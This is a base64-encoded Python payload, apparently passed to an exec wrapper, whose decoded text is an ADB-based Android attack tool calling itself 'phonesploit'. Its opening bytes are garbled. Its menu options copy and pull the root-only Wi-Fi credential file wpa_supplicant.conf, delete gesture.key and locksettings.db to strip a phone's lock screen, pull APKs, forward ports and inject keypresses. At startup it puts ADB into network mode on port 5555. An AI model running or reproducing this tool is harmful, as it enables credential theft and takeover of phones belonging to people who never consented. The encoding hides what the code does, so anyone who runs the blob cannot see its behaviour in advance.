CAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGFwcF9ydW4pICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIHBhY2thZ2UgbmFtZS4gVGhleSBsb29rIGxpa2UgdGhpcyAtLT4gY29tLnNuYXBjaGF0LmFuZHJvaWQiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIHBhY2thZ2VfbmFtZSA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihhcHBfcnVuKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBtb25rZXkgLXAgIitwYWNrYWdlX25hbWUrIiAtdiA1MDAiKQogICAgICAgIG1haW4oKSAgICAgIAoKICAgIGVsaWYgb3B0aW9uID09ICcxNic6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwb3J0X2ZvcndhcmQpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIHBvcnQgb24gdGhlIGRldmljZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIHBvcnRfZGV2aWNlID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHBvcnRfZm9yd2FyZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICAgICAgW3swfSt7MX1dRW50ZXIgYSBwb3J0IHRvIGZvcndhcmQgaXQgdG9vLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZm9yd2FyZF9wb3J0ID0gcmF3X2lucHV0KCIgICAgICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwb3J0X2ZvcndhcmQpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIGZvcndhcmQgdGNwOiIrcG9ydF9kZXZpY2UrIiB0Y3A6Iitmb3J3YXJkX3BvcnQpIAoKICAgIGVsaWYgb3B0aW9uID09ICcxNyc6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBwcmludCAoKCJbezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIod3BhX2dyYWIpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIHByaW50ICgoRm9yZS5XSElURSArICIgICAgW3swfSt7MX1dezF9VEhFIERFVklDRSBORUVEUyBUTyBCRSBST09URUQgVE8gQ09OVElOVUUgVE8gRVhJVCBVU0UgQ1RSTCArQyIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIHdoZXJlIHlvdSB3YW50IHRoZSBmaWxlIHRvIGJlIHNhdmVkLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIGxvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHdwYV9ncmFiKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKSAgICAgIAogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgIisic3UgLWMgJ2NwIC9kYXRhL21pc2Mvd2lmaS93cGFfc3VwcGxpY2FudC5jb25mIC9zZGNhcmQvJyIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsIC9zZGNhcmQvd3BhX3N1cHBsaWNhbnQuY29uZiAiK2xvY2F0aW9uKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgbWFpbigpICAgIAoKICAgIGVsaWYgb3B0aW9uID09ICcxOCc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWNfaW5ldCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBpcCBhZGRyZXNzIHNob3cgd2xhbjAiKQogICAgICAgIG1haW4oKQoKICAgIGVsaWYgb3B0aW9uID09ICcxOSc6CiAgICAgICAgcHJpbnQgKCgiXG5bezB9K3sxfV1FbnRlciBhIGRldmljZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwdWxsX2FwaykgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIGEgcGFja2FnZSBuYW1lLiBUaGV5IGxvb2sgbGlrZSB0aGlzIC0tPiBjb20uc25hcGNoYXQuYW5kcm9pZCIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcGFja2FnZV9uYW1lID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBwbSBwYXRoICIrcGFja2FnZV9uYW1lKQogICAgICAgIHByaW50ICgoIiAgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgICAgICBbezB9K3sxfV1FbnRlciBUaGUgcGF0aC5sb29rcyBsaWtlIHRoaXMgL2RhdGEvYXBwL2NvbS5zbmFwY2hhdC5hbmRyb2lkLXFXZ0RjQmlDRXZBTnE2b3BfTlBxZUE9PS9iYXNlLmFwayIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcGF0aCA9IHJhd19pbnB1dCgiICAgICAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIocHVsbF9hcGspICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgcHJpbnQgKCgiICAgICAgICAgICAgW3swfSt7MX1dRW50ZXIgVGhlIGxvY2F0aW9uIHRvIHN0b3JlIHRoZSBhcGs6ICIpICAuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBsb2NhdGlvbiA9ICAgcmF3X2lucHV0KCIgICAgICAgICAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIocHVsbF9hcGspICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrIiBwdWxsICIrcGF0aCsiICIrbG9jYXRpb24pCiAgICAgICAgbWFpbigpCgogICAgZWxpZiBvcHRpb24gPT0gJzIwJzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGJhdHRlcnkpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrICIgc2hlbGwgZHVtcHN5cyBiYXR0ZXJ5IikKICAgICAgICBtYWluKCkKCiAgICBlbGlmIG9wdGlvbiA9PSAnMjEnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobmV0X3N0YXQpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrICIgc2hlbGwgbmV0c3RhdCIpCiAgICAgICAgbWFpbigpCgogICAgZWxpZiBvcHRpb24gPT0gJzIyJzoKICAgICAgICBwcmludCAoKCJcblt7MH0rezF9XUVudGVyIGEgZGV2aWNlIG5hbWUuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBkZXZpY2VfbmFtZSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHdpZmkpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV0gVG8gdHVybiB3aWZpIGJhY2sgb24geW91IG5lZWQgdGhlIGRldmljZSB0byBiZSBwbHVnZWQgaW4uIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgb25fb2ZmID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAiICAgIFsiK0ZvcmUuUkVEKyIrIitGb3JlLldISVRFKyJdV291bGQgeW91IGxpa2UgdGhlIHdpZmkgIitGb3JlLkdSRUVOICsib24iK0ZvcmUuV0hJVEUgKyIvIitGb3JlLlJFRCArIm9mZiAiK0ZvcmUuV0hJVEUpCiAgICAgICAgaWYgb25fb2ZmID09ICdvZmYnOgogICAgICAgICAgICBjb21tYW5kID0gIiBzaGVsbCBzdmMgd2lmaSBkaXNhYmxlIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGNvbW1hbmQgPSAiIHNoZWxsIHN2YyB3aWZpIGVuYWJsZSIKICAgICAgICAgICAgCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZStjb21tYW5kKQoKICAgIGVsaWYgb3B0aW9uID09ICcyMyc6CiAgICAgICAgcHJpbnQgKCgiW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIocGFzc19yZW1vdmUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgcHJpbnQgKChGb3JlLldISVRFICsgIiAgICBbezB9K3sxfV17MX1USEUgREVWSUNFIE5FRURTIFRPIEJFIFJPT1RFRCBUTyBDT05USU5VRSBUTyBFWElUIFVTRSBDVFJMICtDIFRISVMgSVMgQUxTTyBVTlRFU1RFRCIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgIHByaW50IChGb3JlLlJFRCArICIqKioqKioqKioqKioqKioqKipUUllJTkcgVE8gUkVNT1ZFIFBBU1MqKioqKioqKioqKioqKioqKioiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vZ2VzdHVyZS5rZXknIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc3UgMCAncm0gL2RhdGEvc3lzdGVtL2xvY2tzZXR0aW5ncy5kYiciKSAKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgc3UgMCAncm0gL2RhdGEvc3lzdGVtL2xvY2tzZXR0aW5ncy5kYi13YWwnIikgCiAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHN1IDAgJ3JtIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGItc2htJyIpCiAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgIioqKioqKioqKioqKioqKioqKlRSWUlORyBUTyBSRU1PVkUgUEFTUyoqKioqKioqKioqKioqKioqKiIpICAKICAgICAgICAKICAgIGVsaWYgb3B0aW9uID09ICcyNCc6CiAgICAgICAgcHJpbnQgKCgiW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoa2V5Y29kZSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBwcmludCAoJycnCjAgLS0+ICAiS0VZQ09ERV9VTktOT1dOIiAKMSAtLT4gICJLRVlDT0RFX01FTlUiIAoyIC0tPiAgIktFWUNPREVfU09GVF9SSUdIVCIgCjMgLS0+ICAiS0VZQ09ERV9IT01FIiAKNCAtLT4gICJLRVlDT0RFX0JBQ0siIAo1IC0tPiAgIktFWUNPREVfQ0FMTCIgCjYgLS0+ICAiS0VZQ09ERV9FTkRDQUxMIiAKNyAtLT4gICJLRVlDT0RFXzAiIAo4IC0tPiAgIktFWUNPREVfMSIgCjkgLS0+ICAiS0VZQ09ERV8yIiAKMTAgLS0+ICAiS0VZQ09ERV8zIiAKMTEgLS0+ICAiS0VZQ09ERV80IiAKMTIgLS0+ICAiS0VZQ09ERV81IiAKMTMgLS0+ICAiS0VZQ09ERV82IiAKMTQgLS0+ICAiS0VZQ09ERV83IiAKMTUgLS0+ICAiS0VZQ09ERV84IiAKMTYgLS0+ICAiS0VZQ09ERV85IiAKMTcgLS0+ICAiS0VZQ09ERV9TVEFSIiAKMTggLS0+ICAiS0VZQ09ERV9QT1VORCIgCjE5IC0tPiAgIktFWUNPREVfRFBBRF9VUCIgCjIwIC0tPiAgIktFWUNPREVfRFBBRF9ET1dOIiAKMjEgLS0+ICAiS0VZQ09ERV9EUEFEX0xFRlQiIAoyMiAtLT4gICJLRVlDT0RFX0RQQURfUklHSFQiIAoyMyAtLT4gICJLRVlDT0RFX0RQQURfQ0VOVEVSIiAKMjQgLS0+ICAiS0VZQ09ERV9WT0xVTUVfVVAiIAoyNSAtLT4gICJLRVlDT0RFX1ZPTFVNRV9ET1dOIiAKMjYgLS0+ICAiS0VZQ09ERV9QT1dFUiIgCjI3IC0tPiAgIktFWUNPREVfQ0FNRVJBIiAKMjggLS0+ICAiS0VZQ09ERV9DTEVBUiIgCjI5IC0tPiAgIktFWUNPREVfQSIgCjMwIC0tPiAgIktFWUNPREVfQiIgCjMxIC0tPiAgIktFWUNPREVfQyIgCjMyIC0tPiAgIktFWUNPREVfRCIgCjMzIC0tPiAgIktFWUNPREVfRSIgCjM0IC0tPiAgIktFWUNPREVfRiIgCjM1IC0tPiAgIktFWUNPREVfRyIgCjM2IC0tPiAgIktFWUNPREVfSCIgCjM3IC0tPiAgIktFWUNPREVfSSIgCjM4IC0tPiAgIktFWUNPREVfSiIgCjM5IC0tPiAgIktFWUNPREVfSyIgCjQwIC0tPiAgIktFWUNPREVfTCIgCjQxIC0tPiAgIktFWUNPREVfTSIgCjQyIC0tPiAgIktFWUNPREVfTiIgCjQzIC0tPiAgIktFWUNPREVfTyIgCjQ0IC0tPiAgIktFWUNPREVfUCIgCjQ1IC0tPiAgIktFWUNPREVfUSIgCjQ2IC0tPiAgIktFWUNPREVfUiIgCjQ3IC0tPiAgIktFWUNPREVfUyIgCjQ4IC0tPiAgIktFWUNPREVfVCIgCjQ5IC0tPiAgIktFWUNPREVfVSIgCjUwIC0tPiAgIktFWUNPREVfViIgCjUxIC0tPiAgIktFWUNPREVfVyIgCjUyIC0tPiAgIktFWUNPREVfWCIgCjUzIC0tPiAgIktFWUNPREVfWSIgCjU0IC0tPiAgIktFWUNPREVfWiIgCjU1IC0tPiAgIktFWUNPREVfQ09NTUEiIAo1NiAtLT4gICJLRVlDT0RFX1BFUklPRCIgCjU3IC0tPiAgIktFWUNPREVfQUxUX0xFRlQiIAo1OCAtLT4gICJLRVlDT0RFX0FMVF9SSUdIVCIgCjU5IC0tPiAgIktFWUNPREVfU0hJRlRfTEVGVCIgCjYwIC0tPiAgIktFWUNPREVfU0hJRlRfUklHSFQiIAo2MSAtLT4gICJLRVlDT0RFX1RBQiIgCjYyIC0tPiAgIktFWUNPREVfU1BBQ0UiIAo2MyAtLT4gICJLRVlDT0RFX1NZTSIgCjY0IC0tPiAgIktFWUNPREVfRVhQTE9SRVIiIAo2NSAtLT4gICJLRVlDT0RFX0VOVkVMT1BFIiAKNjYgLS0+ICAiS0VZQ09ERV9FTlRFUiIgCjY3IC0tPiAgIktFWUNPREVfREVMIiAKNjggLS0+ICAiS0VZQ09ERV9HUkFWRSIgCjY5IC0tPiAgIktFWUNPREVfTUlOVVMiIAo3MCAtLT4gICJLRVlDT0RFX0VRVUFMUyIgCjcxIC0tPiAgIktFWUNPREVfTEVGVF9CUkFDS0VUIiAKNzIgLS0+ICAiS0VZQ09ERV9SSUdIVF9CUkFDS0VUIiAKNzMgLS0+ICAiS0VZQ09ERV9CQUNLU0xBU0giIAo3NCAtLT4gICJLRVlDT0RFX1NFTUlDT0xPTiIgCjc1IC0tPiAgIktFWUNPREVfQVBPU1RST1BIRSIgCjc2IC0tPiAgIktFWUNPREVfU0xBU0giIAo3NyAtLT4gICJLRVlDT0RFX0FUIiAKNzggLS0+ICAiS0VZQ09ERV9OVU0iIAo3OSAtLT4gICJLRVlDT0RFX0hFQURTRVRIT09LIiAKODAgLS0+ICAiS0VZQ09ERV9GT0NVUyIgCjgxIC0tPiAgIktFWUNPREVfUExVUyIgCjgyIC0tPiAgIktFWUNPREVfTUVOVSIgCjgzIC0tPiAgIktFWUNPREVfTk9USUZJQ0FUSU9OIiAKODQgLS0+ICAiS0VZQ09ERV9TRUFSQ0giIAo4NSAtLT4gICJUQUdfTEFTVF9LRVlDT0RFIiAgICAgICAgCiAgICAgICAgJycnKSAgICAgICAgCiAgICAgICAgcHJpbnQgKCgiW3swfSt7MX1dRW50ZXIgYSBudW1iZXIuIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICBudW0gPSByYXdfaW5wdXQoYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihrZXljb2RlKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBpbnB1dCBrZXlldmVudCAiK251bSkKCiAgICBlbGlmIG9wdGlvbiA9PSAnMjUnOgogICAgICAgIHByaW50ICgoIlxuW3swfSt7MX1dRW50ZXIgYSBkZXZpY2UgbmFtZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgIGRldmljZV9uYW1lID0gcmF3X2lucHV0KGFycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoY3VycmVudF9hY3Rpdml0eSkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBkdW1wc3lzIGFjdGl2aXR5IikKICAgICAgICBtYWluKCkKICAgICAgICAKICAgIGVsaWYgb3B0aW9uID09ICcwJzoKICAgICAgICBnbG9iYWwgcGFnZTIKICAgICAgICBpZiBwYWdlMiA9PSBUcnVlOgogICAgICAgICAgICBjbGVhcihwYWdlXzIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgY2xlYXIocGFnZV8xKQoKICAgIGVsaWYgb3B0aW9uID09ICdwJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICAgICAgcGFnZTIgPSBUcnVlCiAgICAgICAgYmFubmVyX3RpdGxlID0gcmFuZG9tLmNob2ljZShbbG9nb19kZXNpZ25fMSxsb2dvX2Rlc2lnbl8yLGxvZ29fZGVzaWduXzMsbG9nb19kZXNpZ25fNF0pCiAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQogICAgICAgIHByaW50IChwYWdlXzIpICAKCiAgICBlbGlmIG9wdGlvbiA9PSAnYic6CiAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgICAgIHBhZ2UyID0gRmFsc2UKICAgICAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgICAgICBwcmludCAoRm9yZS5SRUQgKyBiYW5uZXJfdGl0bGUpCiAgICAgICAgcHJpbnQgKHBhZ2VfMSkgIAoKICAgIGVsaWYgb3B0aW9uID09ICc5OSc6CiAgICAgICAgZXhpdCgpCgoKICAgIG1haW4oKQoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgpkZWYgY2xlYXIocGFnZSk6CiAgICBnbG9iYWwgcGFnZTIKICAgIG9zLnN5c3RlbSgnY2xzJykKICAgIGJhbm5lcl90aXRsZSA9IHJhbmRvbS5jaG9pY2UoW2xvZ29fZGVzaWduXzEsbG9nb19kZXNpZ25fMixsb2dvX2Rlc2lnbl8zLGxvZ29fZGVzaWduXzQsbG9nb19kZXNpZ25fNSxsb2dvX2Rlc2lnbl82LGxvZ29fZGVzaWduXzddKQogICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKSAgICAKICAgIHByaW50IChwYWdlKQoKCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gIAojIFJ1bgp0cnk6CiAgICBpbml0KGNvbnZlcnQ9VHJ1ZSkKICAgIG9zLmNoZGlyKEN1cnJlbnREaXIrIi8vYWRiIikKICAgIHByaW50IChGb3JlLlJFRCArICJTdGFydGluZyAgYWRiIHNlcnZlci4uIikKICAgIG9zLnN5c3RlbSgiYWRiIHRjcGlwIDU1NTUiKQogICAgdC5zbGVlcCg0KQogICAgb3Muc3lzdGVtKCdjbHMnKQogICAgYmFubmVyX3RpdGxlID0gcmFuZG9tLmNob2ljZShbbG9nb19kZXNpZ25fMSxsb2dvX2Rlc2lnbl8yLGxvZ29fZGVzaWduXzMsbG9nb19kZXNpZ25fNCxsb2dvX2Rlc2lnbl81LGxvZ29fZGVzaWduXzYsbG9nb19kZXNpZ25fN10pCiAgICBwcmludCAoRm9yZS5SRUQgKyBiYW5uZXJfdGl0bGUpICAKICAgIHByaW50IChwYWdlXzEpCiAgICBtYWluKCkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgbWFpbigpCg=="))
